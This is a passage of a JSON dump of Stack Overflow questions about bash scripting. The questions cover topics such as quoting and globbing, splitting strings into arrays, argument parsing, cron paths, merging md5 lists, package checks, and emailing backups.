arguments?</p>\n"},{"tags":["bash","filesystems","find"],"answer_count":5,"favorite_count":8,"up_vote_count":15,"down_vote_count":0,"view_count":8492,"score":15,"question_id":4561895,"title":"how to recursively find the latest modified file in a directory?","body":"<p>it seems that ls doesn't sort the files correctly, when doing a recursive call:</p>\n\n<pre><code>ls -altR . | head -n 3\n</code></pre>\n\n<p>how can i find the latest modified file in a directory (including subdirectories)?</p>\n\n<p>see you,</p>\n"},{"tags":["bash","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12817072,"title":"Getting unexpected end of file on a base_aliases function","body":"<p>Tearing my hair out trying to work out why this function in my ~/.bash_aliases is causing an error.</p>\n\n<pre><code>function kill-xbmc () { xbmcpid=`ps aux | grep \"[x]bmc\" | awk \"{printf \"%s \",$2}\"`; kill -9 ${xbmcpid} }\n</code></pre>\n\n<p>It keeps producing the same end of file error. I can't seem to see that I'm missing a pair of {} or \"\" marks or anything overly obvious.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12816723,"title":"How to use double quotes in variable to execute it in backquote?","body":"<p>I want to put result of find command to variable - and I have a problem with variable inside command substitution block. Bellow short example:</p>\n\n<pre><code>#!/bin/bash\n\npattern='\"file*\"'\nres=$(find . -maxdepth 1 -type f -name ${pattern}) # doesn't work\n#res=$(find . -maxdepth 1 -type f -name \"file*\") # works\necho $res\n</code></pre>\n\n<p>What's wrong?</p>\n"},{"tags":["arrays","string","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1193,"score":1,"question_id":9293887,"title":"In bash, how do I convert a space-delimited string into an array?","body":"<p>I have a variable which contains a space-delimited string,</p>\n\n<pre><code>line=\"1 1.50 string\"\n</code></pre>\n\n<p>I want to split that string with space as a delimiter and store the result in an array, so that the following:</p>\n\n<pre><code>echo ${arr[0]}\necho ${arr[1]}\necho ${arr[2]}\n</code></pre>\n\n<p>outputs</p>\n\n<pre><code>1\n1.50\nstring\n</code></pre>\n\n<p>Somewhere I found a solution which doesn't work:</p>\n\n<pre><code>arr=$(echo ${line})\n</code></pre>\n\n<p>If I run the echo statements above after this, I get:</p>\n\n<pre><code>1 1.50 string\n[empty line]\n[empty line]\n</code></pre>\n\n<p>I also tried</p>\n\n<pre><code>IFS=\" \"\narr=$(echo ${line})\n</code></pre>\n\n<p>with the same result. Can someone help, please?</p>\n"},{"tags":["bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12322666,"title":"bash script: passing subset of script's arguments to a command","body":"<p>I'm pretty new to shell scripts, so it confuses me a little and I couldn't seem to find a solution to this.  Let's say I have a shell script that can take a number of arguments.  For the sake of example, I could call it as follow:</p>\n\n<p>myscript -a valA -b valB -c valC -d valD some/directory</p>\n\n<p>Now, some of these arguments are for my script itself, while others are for a command that will be called within my script.  So for this case, -a, -d and the directory are for my script, everything else will be for the command.  So I want to do something like this: </p>\n\n<pre><code>args=''\n\nif [ $# == 0 ]\nthen\n    echo \"No arguments found!\"\n    exit 1\nfi\n\nwhile [ \"$2\" ]\ndo\n    if [ $1 == '-a' ]\n    then\n        #some process here\n        shift 2\n    elif [ $1 == '-d' ]\n    then\n        #some process here\n        shift 2\n    else\n        #add the argument to args\n        shift\n    fi\ndone\ndirectory=$1\n\nfor file in $directory/*.txt\ndo \n    #call 'someCommand' here with arguments stored in args + $file\ndone\n</code></pre>\n\n<p>I've tried doing</p>\n\n<pre><code>args=\"$args $1\"\n</code></pre>\n\n<p>Then calling the command doing</p>\n\n<pre><code>someCommand \"$args $file\"\n</code></pre>\n\n<p>but then, someCommand seems to think the whole thing is one single argument.</p>\n\n<p>Also, if you see anything wrong with the rest of my script, feel free to point it out.  It seems to work, but I could very well be missing some corner cases or doing things that may lead to unexpected behaviors.</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","ubuntu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12816322,"title":"how to force to expand a concatenation of $path/*","body":"<p>I'm writing a script to remove some files, but I don't understand how asterisk expansions work. These are my attempts to solve my problem:</p>\n\n<pre><code>rm \"$path\"*.txt\nrm \"$path\"/*.txt\nrm \"$path\"{*}.txt\nrm \"$path\"'*'\nrm \"/folder/folder\\ with\\ spaces/*.txt\"\n</code></pre>\n\n<p>I also tried replacing double quotes (<code>\"</code>) with single quotes(<code>'</code>) and backticks (<code>`</code>). After every script computation, I get an error because the <code>*</code> is not substitute. So now I have two questions: </p>\n\n<ol>\n<li>Why is the asterisk not expanded?</li>\n<li>What's the difference between the different quoting character (` \" ' ...) ?</li>\n</ol>\n"},{"tags":["ruby","bash","shell","terminal","rvm"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":121,"score":1,"question_id":12784889,"title":"Ruby versions differ in Terminal & bash","body":"<p>In Terminal, <code>ruby -v</code> gives me:</p>\n\n<pre><code>ruby 1.8.7 (2011-12-28 patchlevel 357) [universal-darwin11.0]\n</code></pre>\n\n<p>But if I type <code>/bin/bash</code> then <code>ruby -v</code> I get:</p>\n\n<pre><code>ruby 1.9.3p194 (2012-04-20 revision 35410) [x86_64-darwin11.4.0]\n</code></pre>\n\n<p>I suspect this is something to do with my PATH config(s). My $PATH variable is different in both the above environments. There are other issues e.g. <code>rvm</code> won't run unless I go into bash mode.</p>\n\n<p>For info, my <code>~/.bashrc</code> contains:</p>\n\n<pre><code>PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; source \"$HOME/.rvm/scripts/rvm\"  # This loads RVM into a shell session.\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12813987,"title":"bash command spanning multiple lines with several lines of comments in-between","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9522631/bash-how-to-put-line-comment-for-a-multi-line-command\">Bash: How to Put Line Comment for a Multi-line Command</a>  </p>\n</blockquote>\n\n\n\n<p>I would like to do something like this</p>\n\n<pre><code>sudo apt-get install \\\n  #a very long description\n  #of the package\n  #that spans multiple lines\n  pkg1 \\ #maybe I want an inline comment also\n  #another description that\n  #spans multiple lines\n  pkg2\n</code></pre>\n\n<p>Note that I'm not just interested in the <code>apt-get</code> command.</p>\n"},{"tags":["bash","jsp","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12813418,"title":"How to output jsp var to html","body":"<p>I would have thought this straight forward, but it doesn't seem the case.</p>\n\n<p>Aim: I am running a shell script <code>ArgCHeck.sh</code> through my .jsp file. This works fine and I can see the output in my system console.</p>\n\n<p>However when I try and output the line into the browser through HTML, its doesn't seem to work.</p>\n\n<p>I have tried setting the String to <code>Static final String line = \"test\";</code> and this works to output the word test, but not the value I want which is from the other String line.</p>\n\n<p>Its probably something I missed, but any help is appreciate.</p>\n\n<pre><code>&lt;%@page import=\"java.io.*\"%&gt;\n&lt;%@page import=\"java.util.*\"%&gt;\n&lt;%!\n\n%&gt;\n&lt;%\nRuntime r=Runtime.getRuntime();\nProcess p=null;\nString s=null;\nString cmd=\"/tools/scripts/ArgCheck.sh orange\";\n\np=r.exec(cmd);\nInputStreamReader isr=new InputStreamReader(p.getInputStream());\nBufferedReader br=new BufferedReader(isr);\nString line = null;\nwhile((line = br.readLine()) != null){\nSystem.out.println(line);\n}\np.waitFor();\n\n\nSystem.out.println(p.exitValue());\n%&gt;\n&lt;html&gt;\n    &lt;head/&gt;\n    &lt;body&gt;\n        &lt;%\n    // This scriptlet generates HTML output\n    out.println( String.valueOf( line ));\n%&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>--------------------------- Edit -----------------------------------------------------</p>\n\n<p>That's what you get when you cut and paste. I read the code and it was obvious. Time for a break.</p>\n\n<pre><code>&lt;%@page import=\"java.io.*\"%&gt;\n&lt;%@page import=\"java.util.*\"%&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;head/&gt;\n\n&lt;body&gt;\n\n\n&lt;% \nRuntime r=Runtime.getRuntime();\nProcess p=null;\nString s=null;\nString cmd=\"/tools/scripts/ArgCheck.sh\";\n\np=r.exec(cmd);\nInputStreamReader isr=new InputStreamReader(p.getInputStream());\nBufferedReader br=new BufferedReader(isr);\nString line = null;\nwhile((line = br.readLine()) != null){\nout.println(line);\n}\np.waitFor();\n%&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["python","bash","python-interactive"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":51,"score":4,"question_id":12803403,"title":"python interative mode does not work when reading from std in","body":"<p>Given the following python script....</p>\n\n<pre><code>$ cat readStdin.py \n#!/usr/bin/python\n\nimport sys\n\nvar = \"\".join(sys.stdin.readlines()).rstrip()\nprint var\n</code></pre>\n\n<p>... I get the follwing output:</p>\n\n<pre><code>$ echo hello  | python -i readStdin.py \nhello\n&gt;&gt;&gt; \n$\n</code></pre>\n\n<p>...  in other words it does not hang in the python console, but goes back to bash. Does anyone out there know how to make it stay in the python console???</p>\n"},{"tags":["bash","pattern-matching"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":12809644,"title":"bash - match and select best score for string","body":"<p>I'm experimenting with bash scripts, need help solving this:<br>\ni have the following data in a text file: (test.txt)  </p>\n\n<pre><code>have.a.nice.day.a=42and55  \nhave.a.nice.day.b=0  \nhave.a.nice.day.c=55and67  \ngo.to.sleep.a=111  \ngo.to.sleep.b=2and122and33  \ngo.to.sleep.c=64  \n</code></pre>\n\n<p>i want to separate the strings from their matching scores and the scores from their delimiters (in this case: \"and\")  and pick the string with highest score from each group.<br>\nin this case it would be \"have.a.nice.day.c\" for group \"have.a.nice.day\" and \"go.to.sleep.b\" for group \"go.to.sleep\"<br>\nso i thought best thing to do would be to separate the elements and assign them variables recursively. like so:  </p>\n\n<pre><code>#!/bin/bash\nnames=$(cat test.txt | grep -o -P '.+(?==\\d+)')\n for name in $names\n do\n  echo -n \"$name\"\" \"\n  scores=$(cat test.txt | grep -o -P '(?&lt;='$name'=).+')\n   for scores_group in $scores\n   do\n    single_score=$(echo $scores_group | grep -o -P '\\d+') \n     for score in $single_score\n     do\n      echo -n \"$score\"\" \"\n     done\n     echo\n   done\n done  \n</code></pre>\n\n<p>the output would be:  </p>\n\n<pre><code>have.a.nice.day.a 42 55 \nhave.a.nice.day.b 0 \nhave.a.nice.day.c 55 67 \ngo.to.sleep.a 111 \ngo.to.sleep.b 2 122 33 \ngo.to.sleep.c 64  \n</code></pre>\n\n<p>but now i have no idea how to find the best score for each group.<br>\nthanks</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12809682,"title":"Appending text to column in existing tab-delimited file from another file","body":"<p>In one tab-delimited file, it takes the form of:</p>\n\n<p>ID | integer | integer</p>\n\n<pre><code>1   12345    56789\n2   11111    233323\n3   43423    789798\n</code></pre>\n\n<p>Basically file1.txt is a tab-delimited file where the first column is the primary key of a sql database numbered 1-50.  The other two columns are just numbers that correspond to our data set.</p>\n\n<p>Then in another file I have:\nstring | integer</p>\n\n<pre><code>c1  234234\nc10 2342 \nc11 5234\nc2  987987\nc3  234234\n</code></pre>\n\n<p>In file2.txt , the ID is a string where the digit is the corresponding ID in file1.txt.  I want to append the integer data from file2.txt to file1.txt.<br>\nI want the output to be</p>\n\n<pre><code>1   12345    56789    234234\n2   11111    233323   987987\n3   43423    789798   234234\n</code></pre>\n\n<p>Because of the way the data was originally created in the file2 database, the string is the ID.  So when we order it, it's c1,c10,c11,c12...c2,c20,c21,c22.... etc.  I want to line up the numbers with the first file and append the data.  How can I do this?  I'm pretty noob to bash and only found the paste command if my columns already lined up perfectly.  Thanks.</p>\n"},{"tags":["file","bash","arguments"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12809334,"title":"Bash: pass arguments from file line-by-line","body":"<p>I am reading arguments from a file, line-by-line, but each line has several arguments. The gist of the code is below</p>\n\n<pre><code>cat file.txt | while read LINE ; do\n    echo -e `./foo.sh \"$COUNT\" \"$LINE\"`\ndone\n</code></pre>\n\n<p>foo.sh</p>\n\n<pre><code>#!/bin/bash\necho \"$2\\t$3\\t$4\"\n</code></pre>\n\n<p>file.txt</p>\n\n<pre><code>0 0 0\n0 0 1\n0 1 0\n0 0 1\n</code></pre>\n\n<p>returned. Note it is not tabbed</p>\n\n<pre><code>0 0 0\n0 0 1\n0 1 0\n0 0 1\n</code></pre>\n\n<p>This is simpler example of what I'm trying to do; my foo.sh is actually making a sql call using the arguments. I know that my foo.sh function works through debugging, so I've narrowed it down to the line reader. Any help with where I'm going wrong?</p>\n"},{"tags":["linux","osx","bash","vim"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":53,"score":3,"question_id":12799741,"title":"Run spell-check on multiple files and display any incorrect words in shell-script","body":"<p>I have a few files I wish to spellcheck. Normally I would open these in <code>vim</code>, run <code>:set spell</code> and do the changes. It's really teadious to open files and manually check if I've misspelt any words since the last check, however. </p>\n\n<p>Is there a way I can run a spell-check on a lot of files and display any incorrectly-spelt words found, along with the filename, so that I can go and change them? I don't want to open every file, check if it's \"clean\", then open the next and repeat. </p>\n\n<p>I can't find any POSIX spellcheck utility. Some Red-Hat based Linux distributions allegedly have <code>spell</code> or similar, but I'd prefer a cross-platform(ish) method. I know <code>vim</code> <em>can</em> spellcheck - is there any way of spellchecking without doing it all manually? It'd be <em>fantastic</em> if I could shell-script a solution. </p>\n\n<p>I'm running <code>OS X</code>, for what it's worth. </p>\n"},{"tags":["bash","scripting","sh"],"answer_count":7,"favorite_count":5,"up_vote_count":11,"down_vote_count":0,"view_count":2811,"score":11,"question_id":4780203,"title":"Deleting lines from one file which are in another file","body":"<p>I have a file <code>f1</code>:</p>\n\n<pre><code>line1\nline2\nline3\nline4\n..\n..\n</code></pre>\n\n<p>I want to delete all the lines which are in another file <code>f2</code>:</p>\n\n<pre><code>line2\nline8\n..\n..\n</code></pre>\n\n<p>I'm unable to think anything. I tried something with <code>cat</code> and <code>sed</code>, which wasn't even close to what I intended. Please help.</p>\n\n<p><b>EDIT</b></p>\n\n<p>Thanks everyone. I used:</p>\n\n<pre><code>grep -v -i -f f2 f1 &gt; f3\n</code></pre>\n\n<p>There were few things that I didn't mentioned:</p>\n\n<ol>\n<li>Some of the lines had <code>\\</code> in it, so I had to replace all <code>\\</code> by <code>\\\\</code> in <code>f2</code>. No big deal.</li>\n<li>The files were windows files, so grep treated them as binaries and I didn't use <code>-x</code> option.</li>\n<li>I wanted a case-insensitive compare, so used <code>-i</code>.</li>\n<li>I wanted to write the op to <code>f3</code>.</li>\n</ol>\n"},{"tags":["bash","globbing","gnu-parallel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12808011,"title":"Using bash -c and Globbing","body":"<p>I'm running gnu-parallel on a command that works fine when run from a bash shell but returns an error when parallel executes it with bash using the -c flag. I assume this has to do with the special globbing expression I'm using.</p>\n\n<pre><code>ls !(*site*).mol2\n</code></pre>\n\n<p>This returns successfully. </p>\n\n<p>With the flag enabled the command fails</p>\n\n<pre><code>/bin/bash -c 'ls !(*site*).mol2'\n/bin/bash: -c: line 0: syntax error near unexpected token `(' \n</code></pre>\n\n<p>The manual only specifies that -c calls for bash to read the arguments for a string, am I missing something?</p>\n\n<p>Edit:\nI should add I need this to run from a gnu-parallel string, so the end resultant command must be runnable by /bin/bash -c \"Some Command\"</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":70,"score":0,"question_id":12806189,"title":"Bash read -r -d '' FILE_CONTENTS <<'EOF' as root went **nuclear** on me","body":"<p>This typical Bash scripting idiom for assigning a multi-line string literal to a varibale:</p>\n\n<pre><code>read -r -d '' FILE_CONTENTS &lt;&lt;'EOF'\n... contents ...\nEOF\n</code></pre>\n\n<p>has been serving me just fine everywhere I used it.</p>\n\n<p>I run a script containing this idiom as <code>root</code> today, and all hell broke lose. Files would become corrupt, all sorts of weird stuff falling from the sky. I vaporised my Mac. BTW, this mistake has destroyed... everything basically. If I could upvote myself for being nuclear, I would. Effectiveness in self-destruction.</p>\n\n<hr>\n\n<p><img src=\"http://iliketowastemytime.com/sites/default/files/best_animated_gif_nuclear_explosion.gif\" alt=\"Nuclear\"></p>\n\n<hr>\n\n<p>Let me provide you with a minimal working config to reproduct it:</p>\n\n<pre><code># Recreating a .vimrc file, for example\nread -r -d '' FILE_CONTENTS &lt;&lt;'EOF'\n    let mapleader = \"&lt;space&gt;\"\n    let maplocalleader = \"\\\\\"\nEOF\necho \"${FILE_CONTENTS}\" &gt; .vimrc\n</code></pre>\n\n<p>This works just fine as user <code>tinosino</code> but... as root... anything with a backslash is problematic.</p>\n\n<p>Why? Where to look for \"<em>the difference</em>\"? Options? Environment? Aliases on \"echo\" (?!) I am lost. Tried <code>bash -x</code> too: pages and pages of failure on the script I am testing. What could have changed what, in the setup for root? Where?</p>\n\n<pre><code>OS X version: 10.8.2\nBash version: 3.2.48(1)-release\n</code></pre>\n\n<p>I have a <code>sh</code> Vs <code>bash</code> guard in the script but that did not work... was it badly constructed? </p>\n\n<pre><code>if [ ${BASH_VERSION-not_running_within_bash} = not_running_within_bash ]; then\n  echo This script is meant to be executed by the Bash shell but it isn\\'t.\n  echo Continuing from another shell may lead to unpredictable results.\n  echo Execution will be aborted... now.\n  return\nfi\n</code></pre>\n\n<p>It stops <code>zsh</code> but doesn't stop <code>sh</code> from running the script... how could I do that?</p>\n\n<p><strong>EDIT</strong>: I resorted to change the script <em>guard</em> to this:</p>\n\n<pre><code>if [[ ! $(ps -p $$ -o comm | paste -s - | awk '{ print $NF }') == *bash* ]]; then\n</code></pre>\n"},{"tags":["bash","shell","unix","cron","aix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":34,"score":-1,"question_id":12807372,"title":"Cron unable to read property file","body":"<p>I get these error message from cron (when I check mails) </p>\n\n<pre><code>/usr/Mytest/Log_Deleter.sh[3]: ./Log_Deleter.prop:  not found.\n</code></pre>\n\n<p>In my script I have...</p>\n\n<pre><code>#!/bin/ksh\n. ./Log_Deleter.prop\n</code></pre>\n\n<p>my script and property files are located at  /usr/Mytest</p>\n\n<p>I'm not sure why cron doesn't recognize this file. When I execute from the folder, it works fine, but I don't see why its causing error.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["linux","bash","merge","md5"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12752556,"title":"Merging two md5 files in linux","body":"<p><strong>What I'm looking for is a way to merge the contents of two md5 files (let's call them <code>a.md5</code> and <code>b.md5</code>) in an automated fashion.</strong>  Ideally I would like to do this from a bash script, but I am willing to explore alternatives.</p>\n\n<p>I generate <code>a.md5</code> by doing:  </p>\n\n<pre><code>cd a &amp;&amp; find . -type f -print0 | xargs -0 md5sum &gt; ../a.md5\n</code></pre>\n\n<p>Where folder <code>a</code> has a number of files and directories within.\nFrom another folder <code>b</code>, I similarly generate <code>b.md5</code>.<br>\nHere is a snippet of what the contents of the .md5 files will look like:  </p>\n\n<pre><code>8f56e29ec16b2d59949c4a95b5607574  ./usr/share/man/man1/infocmp.1.gz\nf245d527f4dd1fabab719b64414dccf7  ./usr/share/man/man1/clear.1.gz\nc0ae88d29fc406c937c3f64511fa1ab0  ./usr/share/man/man1/modeline2fb.1\n3b83017b7acd38a553c3132a0ccb1fd8  ./usr/share/man/man1/fbset.1\n83530bf6b1a19ca69022536e7ca810b5  ./usr/share/man/man1/sqlite3.1\n</code></pre>\n\n<p>At a later time, folder <code>a</code> will have new files added to it (such as log files), and then be overwritten with folder <code>b</code>, so all unique files of folders <code>a</code> and <code>b</code> are present, and for all collisions, the file from <code>a</code> is replaced by the file from <code>b</code>.</p>\n\n<p>Similarly, I would like to merge the contents of <code>a.md5</code> and <code>b.md5</code> so that in any collisions the <code>b.md5</code> value replaces the <code>a.md5</code> one for a particular file; however, since there are files added prior to the merge that I don't want in the results, I cannot simply recompute a new md5 file.</p>\n\n<p>As a file note to give some context to the above needs, <code>a</code> and <code>b</code> are each the contents of embedded linux filesystems; the contents of <code>a</code> are programmed onto a clean file system, and the contents of <code>b</code> are unpacked into the filesystem at run-time.  The goal of the md5 is to verify the contents have been deployed without error, and ignore the files that are generated by various things at run-time.  I will be generating the md5 on my PC, and doing the <code>md5sum -c</code> on the embedded system.</p>\n\n<p>As stated above, a bash script would be ideal, but I'm open to other suggestions as long as the process can be automated.</p>\n"},{"tags":["bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12805850,"title":"extract characters from filename of newest file","body":"<p>I am writing a bash script where i will need to check a directory for existing files and look at the last 4 digits of the first segment of the file name to set the counter when adding new files to the directory. </p>\n\n<p>Naming Scructure:</p>\n\n<pre><code>yymmddHNAZXLCOM0001.835\n</code></pre>\n\n<p>I need to put the portion in the example 0001 into a CTR variable so the next file it puts into the directory will be </p>\n\n<pre><code>yymmddHNAZXLCOM0002.835\n</code></pre>\n\n<p>and so on. </p>\n\n<p>what would be the easiest and shortest way to do this?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12806839,"title":"syntax check. group two if statements","body":"<pre><code>if [ $DISTRO = \"REDHAT\"] || [ $DISTRO = \"FEDORA\"]; then \n    if ! rpm -qa | grep -q glibc-static; then\n        $BIN_ECHO -e \" Package [glibc-static] not found. Installing.. \"\n        yum install glibc-static\n    elif\n        $BIN_ECHO -e \" All required packages installed.. \"\n    fi\nelif [ $DISTRO = \"DEBIAN\"]; then \n    if ! dpkg-query -l glibc; then\n        $BIN_ECHO -e \" Package [glibc] not found. Installing.. \"\n        apt-get install glibc\n    elif\n        $BIN_ECHO -e \" All required packages installed.. \"\n    fi\nfi\n</code></pre>\n\n<p>line 156: syntax error near unexpected token `fi'</p>\n\n<p>How do I put the two statements together?</p>\n"},{"tags":["linux","bash","grep"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12775783,"title":"Using grep, treating two lines as one?","body":"<p>Suppose I have a configuration file that can be in one of two format below (short example, but basically the first format is a line that is too long that you have to use a line continuation character, while the second format is just simply a long line without the line continuation)</p>\n\n<pre><code>data1=x data2=y data3=z \\\ndatakey\n</code></pre>\n\n<p>second format</p>\n\n<pre><code>data=1 data2=y data3=z datakey\n</code></pre>\n\n<p>I want to match the exact line <code>data1=x data2=y data3=x datakey</code> for both situation. Is there simple way of doing that?</p>\n"},{"tags":["linux","bash","shell","yum","apt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12806176,"title":"Checking for installed packages and if not found install","body":"<p>I need to check for installed packages and if not installed install them. </p>\n\n<p>Example for RHEL, CentOS, Fedora:</p>\n\n<pre><code>rpm -qa | grep glibc-static\nglibc-static-2.12-1.80.el6_3.5.i686\n</code></pre>\n\n<p>How do I do a check in BASH?</p>\n\n<p>Do I do something like?</p>\n\n<pre><code>if [ \"$(rpm -qa | grep glibc-static)\" != \"\" ] ; then\n</code></pre>\n\n<p>And what do I need to use for other distributions? apt-get?</p>\n"},{"tags":["bash","shell","scripting","coffeescript"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":1,"view_count":267,"score":5,"question_id":10239235,"title":"Are there any languages that compile to Bash?","body":"<p>I both love and hate writing Bash. I love that it's <em>so</em> streamlined for operating on files and working with processes (I agree with <a href=\"http://stackoverflow.com/questions/3637668/why-are-scripting-languages-e-g-perl-python-ruby-not-suitable-as-shell-lang\">this popular question</a> that it's way better in this regard than Python, Ruby, etc.), but I <em>hate</em> the syntax, particularly around conditionals, loops, etc.</p>\n\n<p>(This is subjective, but I find it both confusing and annoying. E.g. <code>$var</code> when reading, but <code>var</code> when writing; writes silently fail if there are spaces around <code>=</code>; the double brackets in ifs when using regexp; double semicolons sometimes and single semicolons others; etc.)</p>\n\n<p>As a huge fan of CoffeeScript, which compiles to JS, I've been wondering: are there any languages that have the aesthetic/syntax of languages like Python/Ruby/CoffeeScript but which compile and run as Bash instead of one of those other runtimes?</p>\n\n<p>E.g. I'd love to be able to write mostly-Bash with just a bit simpler syntax:</p>\n\n<pre><code>$AGGREGATE_FILENAME = 'allfiles.txt'\n\nif not exists $AGGREGATE_FILENAME\n    touch $AGGREGATE_FILENAME\n\nfor $file in files/*\n    cat $file &gt;&gt; $AGGREGATE_FILENAME\n\nswitch $1\n    case 'test'\n        run-tests\n        echo 'Tests finished!'\n    case 'deploy'\n        echo 'Packaging...'\n        mv foo bar/\n        deploy-bar\n</code></pre>\n\n<p>This is a super contrived example, and the syntax is a strawman (mostly inspired from CoffeeScript but keeping the essential Bash notions of first-class commands, separated from variables, and loose typing).</p>\n\n<p>Anyway, just a question and food for thought. I'd <em>love</em> to be able to write my scripts in something nicer than Bash. =) Thanks!</p>\n"},{"tags":["bash","shell","ftp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":414,"score":0,"question_id":10445417,"title":"FTP - Copy a list of files from a file","body":"<p>I have file containing a list of files separated by end of lines</p>\n\n<pre><code>$ cat file_list\nfile1\nfile2\nfile3\n</code></pre>\n\n<p>I want to copy this list of files with FTP</p>\n\n<p>How can I do that ? Do I have to write a script ?</p>\n"},{"tags":["linux","bash","email","command-line","shell"],"answer_count":10,"favorite_count":16,"up_vote_count":24,"down_vote_count":0,"view_count":47652,"score":24,"question_id":17359,"title":"How do I send a file as an email attachment using Linux command line?","body":"<p>I've created a script that runs every night on my Linux server that uses <code>mysqldump</code> to back up each of my MySQL databases to .sql files and packages them together as a compressed .tar file.  The next step I want to accomplish is to send that tar file through email to a remote email server for safekeeping.  I've been able to send the raw script in the body an email by piping the backup text file to <code>mailx</code> like so:</p>\n\n<pre><code>$ cat mysqldbbackup.sql | mailx backup@email.com\n</code></pre>\n\n<p><code>cat</code> echoes the backup file's text which is piped into the <code>mailx</code> program with the recipient's email address passed as an argument.</p>\n\n<p>While this accomplishes what I need, I think it could be one step better, <strong>Is there any way, using shell scripts or otherwise, to send the compressed .tar file to an outgoing email message as an <em>attachment</em>?</strong>  This would beat having to deal with very long email messages which contain header data and often have word-wrapping issues etc.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12802060,"title":"BASH: print the next monday of date","body":"<p>How i can calculate the monday date of next week of one day?\nFor example, if I have one variable with this day:</p>\n\n<pre><code>DAYCHECK=2012-10-24 \n</code></pre>\n\n<p>Calculate the next-monday don't work:</p>\n\n<pre><code>date -d $DAYCHECK -dnext-monday +%Y%m%d\n</code></pre>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I have solved whit this method:</p>\n\n<pre><code>numdaycheck=`date -d $DAYCHECK +%u`\nsum=$((8-$numdaycheck))\ndate=`date -d \"$DAYCHECK $sum days\" +%Y%m%d`\n</code></pre>\n"},{"tags":["linux","bash","cookies","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12803416,"title":"Curl: How to insert value to a cookie?","body":"<p>Ho to insert cookies value in curl? from firebug <em>request headers</em> I can see in the following </p>\n\n<pre><code>Cookie: PHPSESSID=gg792c2ktu6sch6n8q0udd94o0; was=1; uncheck2=1; uncheck3=1; uncheck4=1; uncheck5=0; hd=1; uncheck1=1\"\n</code></pre>\n\n<p>I have tried the following:</p>\n\n<pre><code>curl http://site.com/ -s -L -b cookie.c -c cookie.c -d \"was=1; uncheck2=1; uncheck3=1; uncheck4=1; uncheck5=0; hd=1; uncheck1=1\" &gt; comic\n</code></pre>\n\n<p>and the only thing i see in cookie.c is </p>\n\n<pre><code>PHPSESSID=gg792c2ktu6sch6n8q0udd94o0; was=1;\n</code></pre>\n"},{"tags":["osx","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":74,"score":0,"question_id":12803631,"title":"OSX bash \"sleep\"","body":"<p>I'm trying to suspend or \"sleep\" a specific line in a bash script running in OSX.  The script runs at startup before login.  I'm not seeing the results I'm expecting.  In other words no matter what time I specify after \"sleep\" the script still moves right along with no delay what so ever.  However when I run the script after login, the \"sleep\" command seems to work just fine.</p>\n\n<p>Is it possible that the command file \"sleep\" isn't in the path before login or before my script runs?  Would it help if I placed the path to sleep before the command?  If so where does \"sleep\" live?</p>\n\n<p>Is there another approach or alternative command I could try?</p>\n\n<p>Thanks</p>\n\n<pre><code>#!/bin/bash\n\n#Create the bin directory\nsudo mkdir /usr/local/bin\n\nsleep 10\n\n#Copy the files to the Hard Drive\nsudo cp /Volumes/NO\\ NAME/adbind.bash /usr/local/bin/adbind.bash\nsudo cp /Volumes/NO\\ NAME/com.sjusd.adbind.plist /Library/LaunchDaemons/com.sjusd.adbind.plist\n\n#Fix permissions\nsudo chown root:wheel /usr/local/bin\nsudo chmod 755 /usr/local/bin\nsudo 